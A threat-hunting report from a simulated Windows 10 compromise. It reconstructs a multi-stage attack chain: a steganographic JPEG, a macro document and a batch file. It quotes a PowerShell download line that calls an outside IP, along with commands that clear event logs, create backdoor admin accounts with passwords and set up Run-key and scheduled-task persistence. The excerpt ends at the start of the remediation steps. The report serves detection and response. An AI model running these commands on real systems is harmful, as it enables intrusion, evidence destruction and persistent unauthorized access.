
***
<div align="center">
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>
░░░░████████╗██╗░░██╗██████╗░███████╗░█████╗░████████╗░░░░<br>
░░░░╚══██╔══╝██║░░██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝░░░░<br>
░░░░░░░██║░░░███████║██████╔╝█████╗░░███████║░░░██║░░░░░░░<br>
░░░░░░░██║░░░██╔══██║██╔══██╗██╔══╝░░██╔══██║░░░██║░░░░░░░<br>
░░░░░░░██║░░░██║░░██║██║░░██║███████╗██║░░██║░░░██║░░░░░░░<br>
░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░░░░░<br>
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>
██╗░░██╗██╗░░░██╗███╗░░░██╗████████╗██╗███╗░░░██╗░██████╗░<br>
██║░░██║██║░░░██║████╗░░██║╚══██╔══╝██║████╗░░██║██╔════╝░<br>
███████║██║░░░██║██╔██╗░██║░░░██║░░░██║██╔██╗░██║██║░░███╗<br>
██╔══██║██║░░░██║██║╚██╗██║░░░██║░░░██║██║╚██╗██║██║░░░██║<br>
██║░░██║╚██████╔╝██║░╚████║░░░██║░░░██║██║░╚████║╚██████╔╝<br>
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═══╝░░░╚═╝░░░╚═╝╚═╝░░╚═══╝░╚═════╝░<br>
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>
░░██████╗░███████╗██████╗░░██████╗░██████╗░████████╗░░░░░░<br>
░░██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝░██╗░░<br>
░░██████╔╝█████╗░░██████╔╝██║░░░██║██████╔╝░░░██║░░░░╚═╝░░<br>
░░██╔══██╗██╔══╝░░██╔═══╝░██║░░░██║██╔══██╗░░░██║░░░░██╗░░<br>
░░██║░░██║███████╗██║░░░░░╚██████╔╝██║░░██║░░░██║░░░░╚═╝░░<br>
░░╚═╝░░╚═╝╚══════╝╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░░░░<br>
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░████████╗██╗░░██╗██╗░░░██╗░██████╗░░░░░░░░░░░░<br>
░░░░░░░░░░░░╚══██╔══╝██║░░██║██║░░░██║██╔════╝░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░██║░░░███████║██║░░░██║██║░░███╗░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░██║░░░██╔══██║██║░░░██║██║░░░██║░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░██║░░░██║░░██║╚██████╔╝╚██████╔╝░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░░╚═════╝░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░██╗░░██╗░░░██╗███████╗███████╗░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░██║░░╚██╗░██╔╝██╔════╝██╔════╝░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░██║░░░╚████╔╝░█████╗░░█████╗░░░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░██║░░░░╚██╔╝░░██╔══╝░░██╔══╝░░░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░███████╗██║░░░██║░░░░░███████╗░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░╚══════╝╚═╝░░░╚═╝░░░░░╚══════╝░░░░░░░░░░░░░░<br>
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░<br>

<h3> Analyst: Isaiah River</h3>
</div>

**Classification:** CONFIDENTIAL  
**Report Date:** October 26, 2025  
**Hunting Period:** October 26, 2025, 11:12 AM - 11:45 AM  
**Report Version:** 1.0  
**System Analyzed:** WIN10-ISAIAH



---

## Executive Summary

This threat hunting operation successfully identified and analyzed all malicious artifacts associated with the Thug Lyfe Campaign 2 threat group following execution of the threat simulator on a Windows 10 environment. The hunt was based on indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) documented in the malware analysis report "Searching for a Thug Part 2" dated October 13th, 2025.

### Key Findings

**Total Artifacts Discovered:** 4 of 4 expected malicious files  
**Confirmed Malicious Files:**
- ✅ frontpage.jpg (steganographic image with Base64 PowerShell)
- ✅ image_downloader.exe (malicious downloader)
- ✅ SecurityAdvisory.docm (VBA macro document)
- ⚠️ **asefa.bat (CRITICAL - NOT in original malware analysis)**

**Critical Discovery:** asefa.bat was located and analyzed using Sysmon telemetry. This batch file was referenced but not available to the original malware analysts, representing a significant intelligence gap that has now been filled.

### Risk Assessment

**Overall Threat Level:** CRITICAL  
**Active Compromise:** YES - Multiple persistence mechanisms established  
**Data Exfiltration Risk:** HIGH - Extensive reconnaissance performed  
**Lateral Movement Risk:** HIGH - Admin accounts created  
**Privilege Escalation:** CONFIRMED - Backdoor admin accounts established

### asefa.bat Malicious Capabilities

The batch file performed the following critical actions:
1. **Anti-Forensics:** Cleared Application, Security, and System event logs
2. **Persistence:** Established 3 separate persistence mechanisms (scheduled task, RunOnce, Run key)
3. **Privilege Escalation:** Created 2 backdoor administrator accounts
4. **Reconnaissance:** Enumerated system info, users, services, network connections
5. **File Hiding:** Concealed 11 files in C:\ProgramData using hidden/system attributes

### Immediate Actions Taken

1. Documented all malicious artifacts with file hashes and behavioral analysis
2. Captured comprehensive Sysmon telemetry for asefa.bat execution
3. Identified 2 backdoor administrator accounts requiring immediate removal
4. Prepared detailed remediation procedures for incident response team

---

## Table of Contents

1. [Investigation Scope](#1-investigation-scope)
2. [Findings and Analysis](#2-findings-and-analysis)
3. [Attack Timeline Reconstruction](#3-attack-timeline-reconstruction)
4. [Indicators of Compromise](#4-indicators-of-compromise-iocs)
5. [Remediation Steps](#5-remediation-steps)
6. [Recommendations](#6-recommendations)
7. [Conclusion](#8-conclusion)
8. [Appendices](#9-appendices)

---

## 1. Investigation Scope

### 1.1 Objectives

The primary objectives of this threat hunting operation were to:

1. Identify all artifacts associated with the Thug Lyfe Campaign 2
2. Assess the extent of system compromise
3. Determine if active command and control (C2) connections exist
4. Document persistence mechanisms employed by the threat actor
5. **Locate and analyze the asefa.bat file referenced in the malware report**
6. Provide detailed remediation guidance

### 1.2 Hunting Hypothesis

Based on the malware analysis report, we hypothesized that the Thug Lyfe threat group utilized a multi-stage attack chain involving:
- Steganographic image files (frontpage.jpg) containing Base64-encoded PowerShell
- Malicious Office documents (SecurityAdvisory.docm) with VBA macros
- Secondary payload downloaders (image_downloader.exe)
- **Batch file payloads (asefa.bat) for post-exploitation activities**

**Hypothesis Result:** ✅ CONFIRMED - All components of the attack chain were identified and analyzed.

### 1.3 Environment Details

- **System:** Windows 10
- **Hostname:** WIN10-ISAIAH
- **User Account:** IEUser
- **Hunt Start Time:** 11:35:56 AM, October 26, 2025
- **Hunt Duration:** ~10 minutes
- **Tools Used:** PowerShell 7, Hunt-ThugLyfeCampaign2.ps1, Sysmon, Windows Event Logs

---

## 2. Findings and Analysis

### 2.1 Malicious Files Discovered

#### 2.1.1 frontpage.jpg ⚠️ HIGH SEVERITY

**File Details:**
```
Location: C:\Users\Public\Pictures\frontpage.jpg
SHA256: 4E24EACA0183C81D776DBCF5B35AFD601F536F127565E20780D71A3BAB3E0170
MD5: 6a2366799b5474a70e782666fb074e9f
File Size: 40,763 bytes (39.8 KB)
Created: October 26, 2025, 11:12:06 AM
Modified: October 26, 2025, 11:05:32 AM
Last Accessed: October 26, 2025, 11:12:06 AM
```

**Hash Verification:** ✅ SHA256 matches malware analysis report exactly

**Analysis:**
This JPEG image file contains malicious Base64-encoded PowerShell commands hidden in its EXIF metadata. The embedded commands download asefa.bat from the external IP address 108.181.155.31 and save it to C:\ProgramData.

**Embedded Payload (Decoded):**
```powershell
cmd /c powershell invoke-webrequest -uri 'http://108.181.155.31/asefa.bat' 
-outfile 'c:\programdata\asefa.bat'
```

**MITRE ATT&CK Mapping:**
- **T1027.003** - Obfuscation: Steganography
- **T1059.001** - Command and Scripting: PowerShell
- **T1105** - Ingress Tool Transfer
- **T1140** - Deobfuscate/Decode Files or Information

---

#### 2.1.2 image_downloader.exe ⚠️ HIGH SEVERITY

**File Details:**
```
Location: C:\Windows\Temp\image_downloader.exe
SHA256: E84471E37E726FC614A8044E83CB97E4A78EF5B7CC5CE8B5DE440AE724ECB910
MD5: 5207fe630502c3ff2515dd49683c9b2e
File Size: 42,496 bytes (41.5 KB)
Created: October 26, 2025, 11:12:04 AM
Modified: October 26, 2025, 11:05:32 AM
Last Accessed: October 26, 2025, 11:12:04 AM
```

**Hash Verification:** ✅ SHA256 matches malware analysis report exactly

**Analysis:**
PE executable disguised as an image downloader. Downloaded by SecurityAdvisory.docm from IP address 192.168.1.2. Contains HTTP/HTTPS protocol strings and references to multiple IP addresses, indicating network communication capabilities.

**Known Capabilities:**
- Network communication (HTTP/HTTPS)
- Contains hardcoded IP addresses (165.73.244.11, 65.73.244.11, 5.73.244.11)
- References "Startup" for potential persistence
- Downloaded and saved to C:\Windows\Temp by macro document

**MITRE ATT&CK Mapping:**
- **T1105** - Ingress Tool Transfer
- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1547** - Boot or Logon Autostart (potential)

---

#### 2.1.3 SecurityAdvisory.docm ⚠️ HIGH SEVERITY

**File Details:**
```
Location: C:\Users\IEUser\Documents\SecurityAdvisory.docm
SHA256: 7183FBF556628A122F3E51C62034DCC428A79586F1F7EB7C94600968CA2EB66A
MD5: 92910b8ec24ace49e3a6eecf3670ff57
File Size: 16,971 bytes (16.5 KB)
Created: October 26, 2025, 11:12:04 AM
Modified: October 26, 2025, 11:05:32 AM
Last Accessed: October 26, 2025, 11:12:04 AM
```

**Hash Verification:** ✅ SHA256 matches malware analysis report exactly

**Analysis:**
Microsoft Word macro-enabled document containing malicious VBA macro configured to execute automatically. The macro downloads image_downloader.exe from 192.168.1.2 and saves it to C:\Windows\Temp, then executes it.

**Macro Behavior:**
```vba
AutoOpen() Function:
1. Creates Microsoft.XMLHTTP object
2. Opens GET request to http://192.168.1.2/image_downloader.exe
3. Creates Adodb.Stream object
4. Writes downloaded binary to C:\Windows\Temp\image_downloader.exe
5. Executes the downloaded file via Shell command
```

**MITRE ATT&CK Mapping:**
- **T1566.001** - Phishing: Spearphishing Attachment
- **T1204.002** - User Execution: Malicious File
- **T1059.005** - Command and Scripting: Visual Basic
- **T1105** - Ingress Tool Transfer

---

#### 2.1.4 asefa.bat 🚨 CRITICAL SEVERITY - NEW DISCOVERY

**File Details:**
```
Location: C:\ProgramData\asefa.bat
File Size: Unknown (deleted during execution)
Created: October 26, 2025, 11:12:07 AM (Sysmon Event ID 11)
Created By: C:\Users\IEUser\Desktop\thuglyfe\thug_simulator.exe (PID 10352)
User Context: WIN10-ISAIAH\IEUser
```

**⚠️ CRITICAL SIGNIFICANCE:**  
This file was referenced in the malware analysis report but was NOT available to the malware analysts for examination. This represents a critical intelligence gap that has now been filled through Sysmon telemetry analysis.

---

### 2.2 asefa.bat Behavioral Analysis

Using Sysmon Event ID 1 (Process Creation) telemetry, we reconstructed the complete execution sequence of asefa.bat. The batch file executed 30 distinct commands performing reconnaissance, privilege escalation, persistence, and anti-forensics.

#### 2.2.1 Reconnaissance Activities

**System Information Collection:**
```
Command: systeminfo /fo csv
Time: 11:12:09 AM
PID: 2928
Purpose: Enumerate OS version, patches, hardware configuration
```

**Network Enumeration:**
```
Commands:
- netsh interface show interface (Network adapters)
- ipconfig /displaydns (DNS cache - identify previously contacted domains)
- netstat -anob (Active network connections and listening ports)
Time: 11:12:13 AM
Purpose: Map network configuration and active connections
```

**User Account Enumeration:**
```
Commands:
- wmic useraccount get name,sid (All user accounts with SIDs)
- net user (Local user accounts)
Time: 11:12:13-14 AM
Purpose: Identify potential accounts for lateral movement
```

**Service and Task Enumeration:**
```
Commands:
- sc query type= service state= all (All services)
- schtasks /query /fo CSV /v (All scheduled tasks)
Time: 11:12:14 AM
Purpose: Identify security products and potential persistence locations
```

**Registry Enumeration:**
```
Commands:
- reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
Time: 11:12:17 AM
Purpose: Identify installed software and existing persistence mechanisms
```

**MITRE ATT&CK Mapping:**
- **T1082** - System Information Discovery
- **T1016** - System Network Configuration Discovery
- **T1049** - System Network Connections Discovery
- **T1033** - System Owner/User Discovery
- **T1007** - System Service Discovery
- **T1012** - Query Registry
- **T1518** - Software Discovery

---

#### 2.2.2 Privilege Escalation - Backdoor Account Creation

**Account 1: SYSTEM_SERVICE**
```
Creation Command: net user SYSTEM_SERVICE Svc@Admin#99 /add
Privilege Escalation: net localgroup Administrators SYSTEM_SERVICE /add
Time: 11:12:17 AM
PIDs: 9776 (creation), 2336 (privilege escalation)
```

**Account 2: Administators (Typosquatting)**
```
Creation Command: net user Administators Secur1ty@2025 /add
Privilege Escalation: net localgroup Administrators Administators /add
Time: 11:12:17 AM
PIDs: 2300 (creation), 7236 (privilege escalation)
```

**Analysis:**
- **SYSTEM_SERVICE**: Mimics legitimate service account naming conventions
- **Administators**: Typosquatting attack - note misspelling of "Administrators"
- Both accounts added to local Administrators group = full system control
- Strong passwords used to resist brute force attacks
- Accounts blend in with legitimate system accounts

**MITRE ATT&CK Mapping:**
- **T1136.001** - Create Account: Local Account
- **T1098** - Account Manipulation
- **T1078.003** - Valid Accounts: Local Accounts

**Risk Assessment:** 🚨 CRITICAL  
These backdoor accounts provide persistent administrative access to the system even if other malware artifacts are removed.

---

#### 2.2.3 Anti-Forensics - Event Log Clearing

**Event Logs Cleared:**
```
Command: wevtutil cl Application
Command: wevtutil cl Security  
Command: wevtutil cl System
Time: 11:12:17 AM
PIDs: 3872, 9208, 6820
```

**Analysis:**
- Cleared Application, Security, and System event logs
- Removes evidence of malicious activity
- Security log clearing removes authentication events, process creation, etc.
- Application log clearing removes software errors that might expose malware
- System log clearing removes service starts, driver loads, etc.

**MITRE ATT&CK Mapping:**
- **T1070.001** - Indicator Removal: Clear Windows Event Logs

**Detection Note:**  
Event ID 1102 (Security Log Cleared) would normally be logged, but since the Security log itself was cleared, this evidence was also removed. Only Sysmon telemetry preserved this activity.

---

#### 2.2.4 File Hiding - Anti-Forensics

**Files Hidden with System/Hidden Attributes:**

The batch file used `attrib +h +s` to mark 11 files as both Hidden and System files in C:\ProgramData:

| File Name | Purpose (Suspected) | Time | PID |
|-----------|---------------------|------|-----|
| SecurityUpdate | Malware directory | 11:12:17 AM | 7680 |
| autorun.dat | Persistence configuration | 11:12:17 AM | 10144 |
| apps.dat | Application inventory | 11:12:17 AM | 2200 |
| jobs.dat | Scheduled tasks list | 11:12:17 AM | 5888 |
| services.dat | Service enumeration | 11:12:17 AM | 8868 |
| userlist.dat | User account list | 11:12:17 AM | 10524 |
| accounts.dat | Account credentials (possible) | 11:12:17 AM | 6696 |
| connections.dat | Network connections | 11:12:17 AM | 7192 |
| dns.dat | DNS cache dump | 11:12:17 AM | 4740 |
| network.dat | Network configuration | 11:12:17 AM | 8000 |
| config.dat | System configuration | 11:12:17 AM | 8496 |

**Analysis:**
- Files marked with both Hidden (+h) and System (+s) attributes
- Hidden files don't appear in normal directory listings
- System attribute makes files appear as critical OS files
- Located in C:\ProgramData - commonly used by malware
- File extensions (.dat) appear generic and non-threatening
- Files likely contain reconnaissance data for exfiltration

**MITRE ATT&CK Mapping:**
- **T1564.001** - Hide Artifacts: Hidden Files and Directories
- **T1070.004** - Indicator Removal: File Deletion (potential)

---

#### 2.2.5 Persistence Mechanisms

**Persistence Method 1: Scheduled Task**
```
Command: schtasks /create /tn "WindowsUpdateCheck" 
         /tr "C:\ProgramData\SecurityUpdate\svchost.exe" 
         /sc onlogon /rl HIGHEST /f
Time: 11:12:17 AM
PID: 9368
```

**Analysis:**
- Task Name: "WindowsUpdateCheck" (typosquatting "Windows Update")
- Trigger: On user logon
- Privilege Level: HIGHEST (runs with administrative rights)
- Executable: C:\ProgramData\SecurityUpdate\svchost.exe (fake svchost)
- Force flag (/f) overwrites existing task if present

---

**Persistence Method 2: Registry RunOnce**
```
Command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" 
         /v "SecurityScan" /t REG_SZ 
         /d "C:\ProgramData\SecurityUpdate\svchost.exe" /f
Time: 11:12:17 AM
PID: 5816
```

**Analysis:**
- Registry Key: HKCU RunOnce (executes once per user)
- Value Name: "SecurityScan" (appears legitimate)
- Runs on next user login, then removes itself
- One-time execution per user account

---

**Persistence Method 3: Registry Run**
```
Command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 
         /v "WindowsDefender" /t REG_SZ 
         /d "C:\ProgramData\SecurityUpdate\svchost.exe" /f
Time: 11:12:17 AM
PID: 1096
```

**Analysis:**
- Registry Key: HKCU Run (executes every login)
- Value Name: "WindowsDefender" (typosquatting legitimate software)
- Persistent execution on every user login
- Most reliable persistence method

**Persistence Executable:** C:\ProgramData\SecurityUpdate\svchost.exe
- **Critical Note:** This file was NOT found during the hunt
- Possible explanations:
  1. Simulator did not deploy the actual payload
  2. File was removed by antivirus
  3. Placeholder for future payload delivery

**MITRE ATT&CK Mapping:**
- **T1053.005** - Scheduled Task/Job: Scheduled Task
- **T1547.001** - Boot or Logon Autostart: Registry Run Keys
- **T1036.005** - Masquerading: Match Legitimate Name or Location (svchost.exe typosquatting)

---

### 2.3 Complete asefa.bat Execution Timeline

| Time | Action | Command | PID | MITRE Technique |
|------|--------|---------|-----|-----------------|
| 11:12:07 AM | File Creation | asefa.bat created | 10352 | T1105 |
| 11:12:09 AM | CMD Launch | cmd.exe /c asefa.bat | 8944 | T1059.003 |
| 11:12:09 AM | Recon | systeminfo /fo csv | 2928 | T1082 |
| 11:12:13 AM | Recon | netsh interface show interface | 10228 | T1016 |
| 11:12:13 AM | Recon | ipconfig /displaydns | 7604 | T1016 |
| 11:12:13 AM | Recon | netstat -anob | 10800 | T1049 |
| 11:12:13 AM | Recon | wmic useraccount get name,sid | 11060 | T1033 |
| 11:12:14 AM | Recon | net user | 10096 | T1033 |
| 11:12:14 AM | Recon | sc query type= service state= all | 9340 | T1007 |
| 11:12:14 AM | Recon | schtasks /query /fo CSV /v | 7584 | T1053.005 |
| 11:12:17 AM | Anti-Forensics | wevtutil cl Application | 3872 | T1070.001 |
| 11:12:17 AM | Anti-Forensics | wevtutil cl Security | 9208 | T1070.001 |
| 11:12:17 AM | Anti-Forensics | wevtutil cl System | 6820 | T1070.001 |
| 11:12:17 AM | Privilege Escalation | net user SYSTEM_SERVICE Svc@Admin#99 /add | 9776 | T1136.001 |
| 11:12:17 AM | Privilege Escalation | net localgroup Administrators SYSTEM_SERVICE /add | 2336 | T1098 |
| 11:12:17 AM | Privilege Escalation | net user Administators Secur1ty@2025 /add | 2300 | T1136.001 |
| 11:12:17 AM | Privilege Escalation | net localgroup Administrators Administators /add | 7236 | T1098 |
| 11:12:17 AM | File Hiding | attrib +h +s SecurityUpdate | 7680 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s autorun.dat | 10144 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s apps.dat | 2200 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s jobs.dat | 5888 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s services.dat | 8868 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s userlist.dat | 10524 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s accounts.dat | 6696 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s connections.dat | 7192 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s dns.dat | 4740 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s network.dat | 8000 | T1564.001 |
| 11:12:17 AM | File Hiding | attrib +h +s config.dat | 8496 | T1564.001 |
| 11:12:17 AM | Persistence | schtasks /create WindowsUpdateCheck | 9368 | T1053.005 |
| 11:12:17 AM | Persistence | reg add RunOnce SecurityScan | 5816 | T1547.001 |
| 11:12:17 AM | Persistence | reg add Run WindowsDefender | 1096 | T1547.001 |
| 11:12:17 AM | Recon | reg query HKLM Run | 7804 | T1012 |
| 11:12:17 AM | Recon | reg query HKCU Run | 244 | T1012 |
| 11:12:17 AM | Recon | reg query HKLM Uninstall | 9720 | T1518 |

**Total Commands Executed:** 30  
**Execution Duration:** ~10 seconds (11:12:09 AM - 11:12:17 AM)  
**Parent Process:** thug_simulator.exe

---

### 2.4 Backdoor Accounts - Detailed Analysis

**Account: SYSTEM_SERVICE**
```
Username: SYSTEM_SERVICE
Password: Svc@Admin#99
Group Membership: Administrators
Created: October 26, 2025, 11:12:17 AM
Status: Active (requires verification)
```

**Threat Assessment:**
- **Naming Convention:** Mimics legitimate service accounts (svc_*)
- **Password Strength:** Strong (14 characters, uppercase, lowercase, numbers, symbols)
- **Privilege Level:** Administrator (full system control)
- **Persistence:** Survives artifact removal
- **Detectability:** Low (blends with legitimate service accounts)

---

**Account: Administators (Typosquatting)**
```
Username: Administators
Password: Secur1ty@2025
Group Membership: Administrators
Created: October 26, 2025, 11:12:17 AM
Status: Active (requires verification)
```

**Threat Assessment:**
- **Naming Convention:** Typosquatting "Administrators" (note misspelling)
- **Password Strength:** Strong (14 characters, uppercase, lowercase, numbers, symbols)
- **Privilege Level:** Administrator (full system control)
- **Persistence:** Survives artifact removal
- **Detectability:** Moderate (misspelling may be noticed by observant admins)
- **Clever Tactic:** Admins may glance at it and assume it's legitimate

---

## 3. Attack Timeline Reconstruction

### Complete Attack Chain

```
┌─────────────────────────────────────────────────────────────────────┐
│              Thug Lyfe Campaign 2 - Full Attack Chain               │
└─────────────────────────────────────────────────────────────────────┘

[Stage 1: Initial Access - 11:12:04 AM]
    │
    └─> User opens SecurityAdvisory.docm
            │
            └─> VBA AutoOpen() macro executes
                    │
                    ├─> Downloads image_downloader.exe from 192.168.1.2
                    │       └─> Saves to C:\Windows\Temp\
                    │
                    └─> [Execution of image_downloader.exe]
                            └─> (Capabilities unknown - network downloader)

[Stage 2: Secondary Payload Delivery - 11:12:06-07 AM]
    │
    └─> frontpage.jpg processed (user views or automated extraction)
            │
            └─> Base64 PowerShell payload decoded
                    │
                    └─> PowerShell executes invoke-webrequest
                            │
                            └─> Downloads asefa.bat from 108.181.155.31
                                    │
                                    └─> Saves to C:\ProgramData\asefa.bat
                                            │
                                            └─> File created: 11:12:07 AM

[Stage 3: Post-Exploitation - 11:12:09-17 AM]
    │
    └─> thug_simulator.exe launches asefa.bat
            │
            ├─> [Reconnaissance Phase: 11:12:09-14 AM]
            │   ├─> System information (systeminfo)
            │   ├─> Network configuration (netsh, ipconfig, netstat)
            │   ├─> User accounts (wmic, net user)
            │   ├─> Services (sc query)
            │   ├─> Scheduled tasks (schtasks)
            │   └─> Registry keys (reg query)
            │
            ├─> [Anti-Forensics Phase: 11:12:17 AM]
            │   ├─> Clear Application log
            │   ├─> Clear Security log
            │   ├─> Clear System log
            │   └─> Hide 11 files in C:\ProgramData
            │
            ├─> [Privilege Escalation Phase: 11:12:17 AM]
            │   ├─> Create user: SYSTEM_SERVICE
            │   ├─> Add SYSTEM_SERVICE to Administrators
            │   ├─> Create user: Administators
            │   └─> Add Administators to Administrators
            │
            └─> [Persistence Phase: 11:12:17 AM]
                ├─> Scheduled task: WindowsUpdateCheck
                ├─> Registry RunOnce: SecurityScan
                └─> Registry Run: WindowsDefender
                    └─> All point to: C:\ProgramData\SecurityUpdate\svchost.exe

[Stage 4: Persistence Activation - On Next Logon]
    │
    └─> User logs in
            │
            ├─> Scheduled task executes svchost.exe (HIGHEST privileges)
            ├─> RunOnce executes svchost.exe (one-time)
            └─> Run executes svchost.exe (every login)
                    │
                    └─> [Payload behavior unknown - file not deployed]
```

### Detailed Timeline Table

| Time | Event | Artifact | Severity | Evidence |
|------|-------|----------|----------|----------|
| 11:05:32 AM | Pre-staging | All files modified | INFO | File timestamps |
| 11:12:04 AM | Initial delivery | SecurityAdvisory.docm | HIGH | File creation |
| 11:12:04 AM | Macro execution | VBA AutoOpen() | CRITICAL | Behavioral analysis |
| 11:12:04 AM | Download | image_downloader.exe | HIGH | File creation |
| 11:12:06 AM | Steganography | frontpage.jpg | HIGH | File creation |
| 11:12:06 AM | PowerShell execution | invoke-webrequest | CRITICAL | Embedded payload |
| 11:12:07 AM | Batch file creation | asefa.bat | CRITICAL | Sysmon Event ID 11 |
| 11:12:09 AM | Batch execution | cmd.exe launches asefa.bat | CRITICAL | Sysmon Event ID 1 |
| 11:12:09-14 AM | Reconnaissance | 8 enumeration commands | HIGH | Sysmon Event ID 1 |
| 11:12:17 AM | Log clearing | 3 wevtutil commands | CRITICAL | Sysmon Event ID 1 |
| 11:12:17 AM | Account creation | 2 backdoor admin accounts | CRITICAL | Sysmon Event ID 1 |
| 11:12:17 AM | File hiding | 11 attrib commands | HIGH | Sysmon Event ID 1 |
| 11:12:17 AM | Persistence | 3 mechanisms established | CRITICAL | Sysmon Event ID 1 |

**Total Attack Duration:** 13 seconds (from initial file creation to persistence establishment)  
**Commands Executed:** 30+ distinct system commands  
**User Interaction Required:** 1 (opening SecurityAdvisory.docm)

---

## 4. Indicators of Compromise (IOCs)

### 4.1 File Hashes

#### SHA256 Hashes (Verified)
```
frontpage.jpg:
4E24EACA0183C81D776DBCF5B35AFD601F536F127565E20780D71A3BAB3E0170

image_downloader.exe:
E84471E37E726FC614A8044E83CB97E4A78EF5B7CC5CE8B5DE440AE724ECB910

SecurityAdvisory.docm:
7183FBF556628A122F3E51C62034DCC428A79586F1F7EB7C94600968CA2EB66A

asefa.bat:
[File deleted during execution - hash not recoverable]
```

#### MD5 Hashes (From malware report)
```
frontpage.jpg: 6a2366799b5474a70e782666fb074e9f
image_downloader.exe: 5207fe630502c3ff2515dd49683c9b2e
SecurityAdvisory.docm: 92910b8ec24ace49e3a6eecf3670ff57
asefa.bat: [Not available]
```

### 4.2 File Paths

**Malicious Files:**
```
C:\Users\Public\Pictures\frontpage.jpg
C:\Windows\Temp\image_downloader.exe
C:\Users\IEUser\Documents\SecurityAdvisory.docm
C:\ProgramData\asefa.bat (deleted post-execution)
```

**Hidden Files Created by asefa.bat:**
```
C:\ProgramData\SecurityUpdate (directory)
C:\ProgramData\autorun.dat
C:\ProgramData\apps.dat
C:\ProgramData\jobs.dat
C:\ProgramData\services.dat
C:\ProgramData\userlist.dat
C:\ProgramData\accounts.dat
C:\ProgramData\connections.dat
C:\ProgramData\dns.dat
C:\ProgramData\network.dat
C:\ProgramData\config.dat
```

**Persistence Payload (Not Found):**
```
C:\ProgramData\SecurityUpdate\svchost.exe
```

### 4.3 Network IOCs

**Malicious IP Addresses:**
- **108.181.155.31** - C2 server hosting asefa.bat
- **192.168.1.2** - Local/staging server for image_downloader.exe
- 165.73.244.11 (referenced in image_downloader.exe)
- 65.73.244.11 (referenced in image_downloader.exe)
- 5.73.244.11 (referenced in image_downloader.exe)

**Malicious URLs:**
```
http://108.181.155.31/asefa.bat
http://192.168.1.2/image_downloader.exe
```

### 4.4 User Account IOCs

**Backdoor Accounts:**
```
Username: SYSTEM_SERVICE
Password: Svc@Admin#99
Group: Administrators
Created: 2025-10-26 11:12:17 AM

Username: Administators
Password: Secur1ty@2025
Group: Administrators
Created: 2025-10-26 11:12:17 AM
```

### 4.5 Persistence IOCs

**Scheduled Task:**
```
Task Name: WindowsUpdateCheck
Command: C:\ProgramData\SecurityUpdate\svchost.exe
Trigger: On user logon
Privilege: HIGHEST
```

**Registry Keys:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
  Value: SecurityScan
  Data: C:\ProgramData\SecurityUpdate\svchost.exe

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  Value: WindowsDefender
  Data: C:\ProgramData\SecurityUpdate\svchost.exe
```

### 4.6 Behavioral IOCs

**Command Sequences:**
- Execution of `wevtutil cl Application/Security/System` in rapid succession
- Execution of `net user <username> <password> /add` followed immediately by `net localgroup Administrators <username> /add`
- Multiple `attrib +h +s` commands targeting .dat files in C:\ProgramData
- Creation of scheduled task with "Windows" in name but non-standard path
- Registry Run/RunOnce keys with legitimate-sounding names pointing to C:\ProgramData

**Process Patterns:**
- cmd.exe spawning wevtutil.exe multiple times
- cmd.exe spawning net.exe for user/group manipulation
- cmd.exe spawning attrib.exe repeatedly
- cmd.exe spawning schtasks.exe and reg.exe for persistence

### 4.7 YARA Rule Recommendations

Create YARA rules to detect:
1. Base64-encoded PowerShell in EXIF metadata
2. Office documents with AutoOpen() macros and XMLHTTP/Adodb.Stream
3. Batch files with log clearing + user creation + persistence commands
4. PE files masquerading as image downloaders

---

## 5. Remediation Steps

### 5.1 Immediate Actions (Priority 1 - Execute Now)

#### Step 1: Isolate the System

```powershell
# Disable all network adapters to prevent C2 communication
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
Write-Host "[✓] Network adapters disabled - system isolated" -ForegroundColor Green
```

**Verification:**
```powershell
Get-NetAdapter | Select-Object Name, Status
# All should show "Disabled"
```

---

#### Step 2: Remove Backdoor Administrator Accounts

